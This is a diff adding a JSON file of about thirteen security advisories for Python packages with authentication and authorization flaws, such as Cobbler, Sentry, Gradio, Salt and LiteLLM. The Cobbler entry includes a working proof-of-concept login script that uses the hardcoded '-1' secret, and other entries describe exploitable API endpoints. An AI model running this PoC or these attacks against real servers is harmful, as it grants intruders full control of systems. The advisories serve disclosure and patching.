@@ -1,0 +1,396 @@
+[
+  {
+    "ghsa_id": "GHSA-m26c-fcgh-cp6h",
+    "cve_id": "CVE-2024-47533",
+    "summary": "cobbler allows anyone to connect to cobbler XML-RPC server with known password and make changes",
+    "description": "### Summary\n\nutils.get_shared_secret() always returns -1 - allows anyone to connect to cobbler XML-RPC as user '' password -1 and make any changes.\n\n### Details\nutils.py get_shared_secret:\n```\ndef get_shared_secret() -> Union[str, int]:\n    \"\"\"\n    The 'web.ss' file is regenerated each time cobblerd restarts and is used to agree on shared secret interchange\n    between the web server and cobblerd, and also the CLI and cobblerd, when username/password access is not required.\n    For the CLI, this enables root users to avoid entering username/pass if on the Cobbler server.\n\n    :return: The Cobbler secret which enables full access to Cobbler.\n    \"\"\"\n\n    try:\n        with open(\"/var/lib/cobbler/web.ss\", 'rb', encoding='utf-8') as fd:\n            data = fd.read()\n    except:\n        return -1\n    return str(data).strip()\n```\nAlways returns `-1` because of the following exception:\n```\nbinary mode doesn't take an encoding argument\n```\n\nThis appears to have been introduced by commit 32c5cada013dc8daa7320a8eda9932c2814742b0 and so affects versions 3.0.0+.\n\n### PoC\n```\n#!/usr/bin/python3\n\nimport ssl\nimport xmlrpc.client\n\nparams = { 'proto': 'https', 'host': 'COBBLER_SERVER', 'port': '443', 'username': '', 'password': -1 }\nssl_context = ssl._create_unverified_context()\n\nurl = '{proto}://{host}:{port}/cobbler_api'.format(**params)\nif ssl_context:\n    conn = xmlrpc.client.ServerProxy(url, context=ssl_context)\nelse:\n    conn = xmlrpc.client.Server(url)\n\ntry:\n    token = conn.login(params['username'], params['password'])\nexcept xmlrpc.client.Fault as e:\n    print(\"Failed to log in to Cobbler '{url}' as '{username}'. {error}\".format(url=url, error=e, **params))\nexcept Exception as e:\n    print(\"Connection to '{url}' failed. {error}\".format(url=url, error=e, **params))\n\nprint(\"Login success!\")\n\nsystem_id = conn.new_system(token)\n```\n\n\n### Impact\nThis gives anyone with network access to a cobbler server full control of the server.\n",
+    "severity": "critical",
+    "cvss_score": 9.8,
+    "cwes": [
+      "CWE-287"
+    ],
+    "published_at": "2024-11-18T20:00:56Z",
+    "references": [
+      "https://github.com/cobbler/cobbler/security/advisories/GHSA-m26c-fcgh-cp6h",
+      "https://nvd.nist.gov/vuln/detail/CVE-2024-47533",
+      "https://github.com/cobbler/cobbler/commit/32c5cada013dc8daa7320a8eda9932c2814742b0",
+      "https://github.com/cobbler/cobbler/commit/e19717623c10b29e7466ed4ab23515a94beb2dda",
+      "https://github.com/advisories/GHSA-m26c-fcgh-cp6h"
+    ],
+    "patch_urls": [
+      "https://github.com/cobbler/cobbler/commit/32c5cada013dc8daa7320a8eda9932c2814742b0",
+      "https://github.com/cobbler/cobbler/commit/e19717623c10b29e7466ed4ab23515a94beb2dda"
+    ],
+    "vulnerabilities": [
+      {
+        "package": "cobbler",
+        "ecosystem": "pip",
+        "vulnerable_range": ">= 3.3.0, < 3.3.7"
+      },
+      {
+        "package": "cobbler",
+        "ecosystem": "pip",
+        "vulnerable_range": ">= 3.0.0, < 3.2.3"
+      }
+    ]
+  },
+  {
+    "ghsa_id": "GHSA-pvjv-386f-c8wh",
+    "cve_id": "CVE-2023-24831",
+    "summary": "Apache IoTDB Grafana Connector vulnerable to Improper Authentication",
+    "description": "Improper Authentication vulnerability in Apache Software Foundation Apache IoTDB. This issue affects Apache IoTDB Grafana Connector from 0.13.0 through 0.13.3.\n\nAttackers could log in without authorization. This is fixed in 0.13.4.",
+    "severity": "critical",
+    "cvss_score": 9.8,
+    "cwes": [
+      "CWE-287"
+    ],
+    "published_at": "2023-04-17T09:30:24Z",
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2023-24831",
+      "https://lists.apache.org/thread/3dgvzgstycf8b5hyf4z3n7cqdhcyln3l",
+      "https://github.com/pypa/advisory-database/tree/main/vulns/apache-iotdb/PYSEC-2023-7.yaml",
+      "https://github.com/advisories/GHSA-pvjv-386f-c8wh"
+    ],
+    "patch_urls": [],
+    "vulnerabilities": [
+      {
+        "package": "org.apache.iotdb:iotdb-grafana-connector",
+        "ecosystem": "maven",
+        "vulnerable_range": ">= 0.13.0, < 0.13.4"
+      },
+      {
+        "package": "apache-iotdb",
+        "ecosystem": "pip",
+        "vulnerable_range": ">= 0.13.0, < 0.13.5"
+      }
+    ]
+  },
+  {
+    "ghsa_id": "GHSA-6q97-8v3g-rpxw",
+    "cve_id": "CVE-2024-36265",
+    "summary": "Apache Submarine Server Core Incorrect Authorization vulnerability",
+    "description": "Incorrect Authorization vulnerability in Apache Submarine Server Core.\n\nThis issue affects Apache Submarine Server Core: from 0.8.0.\n\nAs this project is retired, we do not plan to release a version that fixes this issue. Users are recommended to find an alternative or restrict access to the instance to trusted users.\n\nNOTE: This vulnerability only affects products that are no longer supported by the maintainer.",
+    "severity": "critical",
+    "cvss_score": 9.1,
+    "cwes": [
+      "CWE-863"
+    ],
+    "published_at": "2024-06-12T15:31:45Z",
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2024-36265",
+      "https://lists.apache.org/thread/prckhhst19qxof064hsm8cccxtofvflz",
+      "http://www.openwall.com/lists/oss-security/2024/06/12/3",
+      "https://github.com/pypa/advisory-database/tree/main/vulns/apache-submarine/PYSEC-2024-98.yaml",
+      "https://github.com/advisories/GHSA-6q97-8v3g-rpxw"
+    ],
+    "patch_urls": [],
+    "vulnerabilities": [
+      {
+        "package": "org.apache.submarine:submarine-server-core",
+        "ecosystem": "maven",
+        "vulnerable_range": "= 0.8.0"
+      },
+      {
+        "package": "apache-submarine",
+        "ecosystem": "pip",
+        "vulnerable_range": "= 0.8.0"
+      }
+    ]
+  },
+  {
+    "ghsa_id": "GHSA-7pq6-v88g-wf3w",
+    "cve_id": "CVE-2025-22146",
+    "summary": "Sentry's improper authentication on SAML SSO process allows user impersonation",
+    "description": "### Impact\nA critical vulnerability was discovered in the SAML SSO implementation of Sentry. It was reported to us via our private bug bounty program.\n\nThe vulnerability allows an attacker to take over any user account by using a malicious SAML Identity Provider and another organization on the same Sentry instance. The victim email address must be known in order to exploit this vulnerability.\n\n### Patches\n- [Sentry SaaS](https://sentry.io): The fix was deployed on Jan 14, 2025.\n- [Self-Hosted Sentry](https://github.com/getsentry/self-hosted): If only a single organization is allowed (`SENTRY_SINGLE_ORGANIZATION = True`), then no action is needed. Otherwise, users should upgrade to version 25.1.0 or higher.\n\n### Workarounds\nNo known workarounds.\n\n### References\n- https://github.com/getsentry/sentry/pull/83407",
+    "severity": "critical",
+    "cvss_score": 9.1,
+    "cwes": [
+      "CWE-287"
+    ],
+    "published_at": "2025-01-15T21:25:27Z",
+    "references": [
+      "https://github.com/getsentry/sentry/security/advisories/GHSA-7pq6-v88g-wf3w",
+      "https://github.com/getsentry/sentry/pull/83407",
+      "https://github.com/getsentry/sentry/commit/6db508f7949d117c7dff748a3c82c3a272bf7cfd",
+      "https://nvd.nist.gov/vuln/detail/CVE-2025-22146",
+      "https://github.com/advisories/GHSA-7pq6-v88g-wf3w"
+    ],
+    "patch_urls": [
+      "https://github.com/getsentry/sentry/pull/83407",
+      "https://github.com/getsentry/sentry/commit/6db508f7949d117c7dff748a3c82c3a272bf7cfd"
+    ],
+    "vulnerabilities": [
+      {
+        "package": "sentry",
+        "ecosystem": "pip",
+        "vulnerable_range": ">= 21.12.0, < 25.1.0"
+      }
+    ]
+  },
+  {
+    "ghsa_id": "GHSA-67mg-gm8m-ph5r",
+    "cve_id": "CVE-2023-2227",
+    "summary": "Improper Authorization in modoboa",
+    "description": "In modoboa prior to 2.1.0, sending a GET request to the endpoint `/api/v2/parameters/core/` returns sensitive information without any authentication or authorization.",
+    "severity": "critical",
+    "cvss_score": 9.1,
+    "cwes": [
+      "CWE-285"
+    ],
+    "published_at": "2023-04-21T15:30:18Z",
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2023-2227",
+      "https://github.com/modoboa/modoboa/commit/7bcd3f6eb264d4e3e01071c97c2bac51cdd6fe97",
+      "https://huntr.dev/bounties/351f9055-2008-4af0-b820-01ff66678bf3",
+      "https://github.com/pypa/advisory-database/tree/main/vulns/modoboa/PYSEC-2023-35.yaml",
+      "https://github.com/advisories/GHSA-67mg-gm8m-ph5r"
+    ],
+    "patch_urls": [
+      "https://github.com/modoboa/modoboa/commit/7bcd3f6eb264d4e3e01071c97c2bac51cdd6fe97"
+    ],
+    "vulnerabilities": [
+      {
+        "package": "modoboa",
+        "ecosystem": "pip",
+        "vulnerable_range": "< 2.1.0"
+      }
+    ]
+  },
+  {
+    "ghsa_id": "GHSA-j2pw-vp55-fqqj",
+    "cve_id": "CVE-2024-25128",
+    "summary": "Flask-AppBuilder vulnerable to incorrect authentication when using auth type OpenID ",
+    "description": "### Impact\nWhen Flask-AppBuilder is set to AUTH_TYPE AUTH_OID, allows an attacker to forge an HTTP request, that could deceive the backend into using any requested OpenID service. This vulnerability could grant an attacker unauthorised privilege access if a custom OpenID service is deployed by the attacker and accessible by the backend. \n\nThis vulnerability is only exploitable when the application is using the old (deprecated 10 years ago) OpenID 2.0 authorization protocol (which is very different from the popular OIDC - Open ID Connect - popular protocol used today). Currently, this protocol is regarded as legacy, with significantly reduced usage and not supported for several years by major authorization providers.\n\n### Patches\nUpgrade to Flask-AppBuilder 4.3.11\n\n### Workarounds\nIf upgrade is not possible add the following to your config:\n\n```\nfrom flask import flash, redirect\nfrom flask_appbuilder import expose\nfrom flask_appbuilder.security.sqla.manager import SecurityManager\nfrom flask_appbuilder.security.views import AuthOIDView\nfrom flask_appbuilder.security.forms import LoginForm_oid\n\nbasedir = os.path.abspath(os.path.dirname(__file__))\n\n\nclass FixedOIDView(AuthOIDView):\n    @expose(\"/login/\", methods=[\"GET\", \"POST\"])\n    def login(self, flag=True):\n        form = LoginForm_oid()\n        if form.validate_on_submit():\n            identity_url = None\n            for provider in self.appbuilder.sm.openid_providers:\n                if provider.get(\"url\") == form.openid.data:\n                    identity_url = form.openid.data\n            if identity_url is None:\n                flash(self.invalid_login_message, \"warning\")\n                return redirect(self.appbuilder.get_url_for_login)\n        return super().login(flag=flag)\n\nclass FixedSecurityManager(SecurityManager):\n    authoidview = FixedOIDView\n\n\nFAB_SECURITY_MANAGER_CLASS = \"config.FixedSecurityManager\"\n```",
+    "severity": "critical",
+    "cvss_score": 9.1,
+    "cwes": [
+      "CWE-287"
+    ],
+    "published_at": "2024-02-28T18:37:06Z",
+    "references": [
+      "https://github.com/dpgaspar/Flask-AppBuilder/security/advisories/GHSA-j2pw-vp55-fqqj",
+      "https://github.com/dpgaspar/Flask-AppBuilder/commit/6336456d83f8f111c842b2b53d1e89627f2502c8",
+      "https://nvd.nist.gov/vuln/detail/CVE-2024-25128",
+      "https://github.com/advisories/GHSA-j2pw-vp55-fqqj"
+    ],
+    "patch_urls": [
+      "https://github.com/dpgaspar/Flask-AppBuilder/commit/6336456d83f8f111c842b2b53d1e89627f2502c8"
+    ],
+    "vulnerabilities": [
+      {
+        "package": "Flask-AppBuilder",
+        "ecosystem": "pip",
+        "vulnerable_range": "< 4.3.11"
+      }
+    ]
+  },
+  {
+    "ghsa_id": "GHSA-3c67-5hwx-f6wx",
+    "cve_id": "CVE-2024-47084",
+    "summary": "Gradios's CORS origin validation is not performed when the request has a cookie",
+    "description": "### Impact\n**What kind of vulnerability is it? Who is impacted?**\n\nThis vulnerability is related to **CORS origin validation**, where the Gradio server fails to validate the request origin when a cookie is present. This allows an attacker’s website to make unauthorized requests to a local Gradio server. Potentially, attackers can upload files, steal authentication tokens, and access user data if the victim visits a malicious website while logged into Gradio. This impacts users who have deployed Gradio locally and use basic authentication.\n\n### Patches\nYes, please upgrade to `gradio>=4.44` to address this issue.\n\n### Workarounds\n**Is there a way for users to fix or remediate the vulnerability without upgrading?**\n\nAs a workaround, users can manually enforce stricter CORS origin validation by modifying the `CustomCORSMiddleware` class in their local Gradio server code. Specifically, they can bypass the condition that skips CORS validation for requests containing cookies to prevent potential exploitation.\n\n",
+    "severity": "high",
+    "cvss_score": 8.8,
+    "cwes": [
+      "CWE-285",
+      "CWE-346"
+    ],
+    "published_at": "2024-10-10T21:20:06Z",
+    "references": [
+      "https://github.com/gradio-app/gradio/security/advisories/GHSA-3c67-5hwx-f6wx",
+      "https://nvd.nist.gov/vuln/detail/CVE-2024-47084",
+      "https://github.com/pypa/advisory-database/tree/main/vulns/gradio/PYSEC-2024-196.yaml",
+      "https://github.com/advisories/GHSA-3c67-5hwx-f6wx"
+    ],
+    "patch_urls": [],
+    "vulnerabilities": [
+      {
+        "package": "gradio",
+        "ecosystem": "pip",
+        "vulnerable_range": "< 4.44.0"
+      }
+    ]
+  },
+  {
+    "ghsa_id": "GHSA-5824-cm3x-3c38",
+    "cve_id": "CVE-2023-39363",
+    "summary": "Vyper has incorrectly allocated named re-entrancy locks",
+    "description": "### Impact\n\nIn versions 0.2.15, 0.2.16 and 0.3.0, named re-entrancy locks are allocated incorrectly. Each function using a named re-entrancy lock gets a unique lock regardless of the key, allowing cross-function re-entrancy in contracts compiled with the susceptible versions. A specific set of conditions is required to result in misbehavior of affected contracts, specifically:\n\n- A `.vy` contract compiled with either of the following `vyper` versions: `0.2.15`, `0.2.16`, `0.3.0`\n- A primary function that utilizes the `@nonreentrant` decorator with a specific `key` and does not strictly follow the check-effects-interaction pattern (i.e. contains an external call to an untrusted party before storage updates)\n- A secondary function that utilizes the same `key` and would be affected by the improper state caused by the primary function\n\n### Patches\nhttps://github.com/vyperlang/vyper/pull/2439, https://github.com/vyperlang/vyper/pull/2514\n\n### Workarounds\nUpgrade to 0.3.1 or higher\n\n### References\nTechnical post-mortem report: https://hackmd.io/@vyperlang/HJUgNMhs2",
+    "severity": "critical",
+    "cvss_score": 8.7,
+    "cwes": [
+      "CWE-863"
+    ],
+    "published_at": "2023-08-09T14:27:57Z",
+    "references": [
+      "https://github.com/vyperlang/vyper/security/advisories/GHSA-5824-cm3x-3c38",
+      "https://nvd.nist.gov/vuln/detail/CVE-2023-39363",
+      "https://github.com/vyperlang/vyper/pull/2439",
+      "https://github.com/vyperlang/vyper/pull/2514",
+      "https://hackmd.io/@LlamaRisk/BJzSKHNjn",
+      "https://hackmd.io/@vyperlang/HJUgNMhs2",
+      "https://github.com/pypa/advisory-database/tree/main/vulns/vyper/PYSEC-2023-142.yaml",
+      "https://github.com/advisories/GHSA-5824-cm3x-3c38"
+    ],
+    "patch_urls": [
+      "https://github.com/vyperlang/vyper/pull/2439",
+      "https://github.com/vyperlang/vyper/pull/2514"
+    ],
+    "vulnerabilities": [
+      {
+        "package": "vyper",
+        "ecosystem": "pip",
+        "vulnerable_range": ">= 0.2.15, < 0.3.1"
+      }
+    ]
+  },
+  {
+    "ghsa_id": "GHSA-pqwr-phvv-v49f",
+    "cve_id": "CVE-2024-7039",
+    "summary": "Open WebUI Allows Admin Deletion via API Endpoint",
+    "description": "In open-webui/open-webui version v0.3.8, there is an improper privilege management vulnerability. The application allows an attacker, acting as an admin, to delete other administrators via the API endpoint `http://0.0.0.0:8080/api/v1/users/{uuid_administrator}`. This action is restricted by the user interface but can be performed through direct API calls.",
+    "severity": "high",
+    "cvss_score": 8.3,
+    "cwes": [
+      "CWE-269",
+      "CWE-863"
+    ],
+    "published_at": "2025-03-20T12:32:45Z",
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2024-7039",
+      "https://huntr.com/bounties/27fc8a5a-546e-4cf2-8edb-df42e36518fc",
+      "https://github.com/advisories/GHSA-pqwr-phvv-v49f"
+    ],
+    "patch_urls": [],
+    "vulnerabilities": [
+      {
+        "package": "open-webui",
+        "ecosystem": "pip",
+        "vulnerable_range": "<= 0.3.8"
+      }
+    ]
+  },
+  {
+    "ghsa_id": "GHSA-c46w-gr7f-jm2p",
+    "cve_id": "CVE-2025-22239",
+    "summary": "Salt vulnerable to arbitrary event injection",
+    "description": "Arbitrary event injection on Salt Master. The master's \"_minion_event\" method can be used by and authorized minion to send arbitrary events onto the master's event bus.",
+    "severity": "high",
+    "cvss_score": 8.1,
+    "cwes": [
+      "CWE-285"
+    ],
+    "published_at": "2025-06-13T09:30:33Z",
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2025-22239",
+      "https://docs.saltproject.io/en/3006/topics/releases/3006.12.html",
+      "https://docs.saltproject.io/en/3007/topics/releases/3007.4.html",
+      "https://github.com/saltstack/salt/commit/41d834bf800d86fc496e4fac2d3875fc2aca7c62",
+      "https://github.com/advisories/GHSA-c46w-gr7f-jm2p"
+    ],
+    "patch_urls": [
+      "https://github.com/saltstack/salt/commit/41d834bf800d86fc496e4fac2d3875fc2aca7c62"
+    ],
+    "vulnerabilities": [
+      {
+        "package": "salt",
+        "ecosystem": "pip",
+        "vulnerable_range": ">= 3006.0rc1, < 3006.12"
+      },
+      {
+        "package": "salt",
+        "ecosystem": "pip",
+        "vulnerable_range": ">= 3007.0rc1, < 3007.4"
+      }
+    ]
+  },
+  {
+    "ghsa_id": "GHSA-jh7c-xh74-h76f",
+    "cve_id": "CVE-2025-22236",
+    "summary": "Salt has minion event bus authorization bypass vulnerability",
+    "description": "Minion event bus authorization bypass. An attacker with access to a minion key can craft a message which may be able to execute a job on other minions (>= 3007.0).",
+    "severity": "high",
+    "cvss_score": 8.1,
+    "cwes": [
+      "CWE-287"
+    ],
+    "published_at": "2025-06-13T09:30:33Z",
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2025-22236",
+      "https://docs.saltproject.io/en/3006/topics/releases/3006.12.html",
+      "https://docs.saltproject.io/en/3007/topics/releases/3007.4.html",
+      "https://github.com/advisories/GHSA-jh7c-xh74-h76f"
+    ],
+    "patch_urls": [],
+    "vulnerabilities": [
+      {
+        "package": "salt",
+        "ecosystem": "pip",
+        "vulnerable_range": ">= 3007.0, < 3007.4"
+      },
+      {
+        "package": "salt",
+        "ecosystem": "pip",
+        "vulnerable_range": ">= 3006.0, < 3006.12"
+      }
+    ]
+  },
+  {
+    "ghsa_id": "GHSA-fjcf-3j3r-78rp",
+    "cve_id": "CVE-2025-0628",
+    "summary": "LiteLLM Has an Improper Authorization Vulnerability",
+    "description": "An improper authorization vulnerability exists in the main-latest version of BerriAI/litellm. When a user with the role 'internal_user_viewer' logs into the application, they are provided with an overly privileged API key. This key can be used to access all the admin functionality of the application, including endpoints such as '/users/list' and '/users/get_users'. This vulnerability allows for privilege escalation within the application, enabling any account to become a PROXY ADMIN.",
+    "severity": "high",
+    "cvss_score": 8.1,
+    "cwes": [
+      "CWE-266",
+      "CWE-285"
+    ],
+    "published_at": "2025-03-20T12:32:52Z",
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2025-0628",
+      "https://github.com/berriai/litellm/commit/566d9354aab4215091b2e51ad0333e948125fa1b",
+      "https://huntr.com/bounties/6c0e2f75-2d03-42f9-9530-e16a973317fc",
+      "https://github.com/advisories/GHSA-fjcf-3j3r-78rp"
+    ],
+    "patch_urls": [
+      "https://github.com/berriai/litellm/commit/566d9354aab4215091b2e51ad0333e948125fa1b"
+    ],
+    "vulnerabilities": [
+      {
+        "package": "litellm",
+        "ecosystem": "pip",
+        "vulnerable_range": "< 1.61.15"
+      }
+    ]
+  },
+  {
+    "ghsa_id": "GHSA-gprj-3p75-f996",
+    "cve_id": "CVE-2024-37300",
+    "summary": "Globus `identity_provider` restriction ignored when used with `allow_all` in JupyterHub 5.0",
+    "description": "### Impact\n\nJupyterHub < 5.0, when used with `GlobusOAuthenticator`, could be configured to allow all users from a particular institution only. The configuration for this would look like:\n\n```python\n# Require users to be using the \"foo.horse\" identity provider, often an institution or university\nc.GlobusAuthenticator.identity_provider = \"foo.horse\"\n# Allow everyone who has that identity provider to log in\nc.GlobusAuthenticator.allow_all = True\n```\n\nThis worked fine prior to JupyterHub 5.0, because `allow_all` *did not* take precedence over `identity_provider`.\n\nSince JupyterHub 5.0, `allow_all` *does* take precedence over `identity_provider`. On a hub with the same config, now **all** users will be allowed to login, regardless of `identity_provider`. `identity_provider` will basically be ignored.\n\nThis is a [documented change](https://jupyterhub.readthedocs.io/en/stable/howto/upgrading-v5.html#authenticator-allow-all-and-allow-existing-users) in JupyterHub 5.0,\nbut is likely to catch many users by surprise.\n\n### Patches\n\nOAuthenticator 16.3.1 fixes the issue with JupyterHub 5.0, and does not affect previous versions.\n\n### Workarounds\n\nDo not upgrade to JupyterHub 5.0 when using `GlobusOAuthenticator` in the prior configuration.",
+    "severity": "high",
+    "cvss_score": 8.1,
+    "cwes": [
+      "CWE-863"
+    ],
+    "published_at": "2024-06-12T17:13:07Z",
+    "references": [
+      "https://github.com/jupyterhub/oauthenticator/security/advisories/GHSA-gprj-3p75-f996",
+      "https://github.com/jupyterhub/oauthenticator/commit/d1aea05fa89f2beae15ab0fa0b0d071030f79654",
+      "https://nvd.nist.gov/vuln/detail/CVE-2024-37300",
+      "https://jupyterhub.readthedocs.io/en/stable/howto/upgrading-v5.html#authenticator-allow-all-and-allow-existing-users",
+      "https://github.com/advisories/GHSA-gprj-3p75-f996"
+    ],
+    "patch_urls": [
+      "https://github.com/jupyterhub/oauthenticator/commit/d1aea05fa89f2beae15ab0fa0b0d071030f79654"
+    ],
+    "vulnerabilities": [
+      {
+        "package": "oauthenticator",
+        "ecosystem": "pip",
+        "vulnerable_range": "< 16.3.1"
+      }
+    ]
+  }
+]
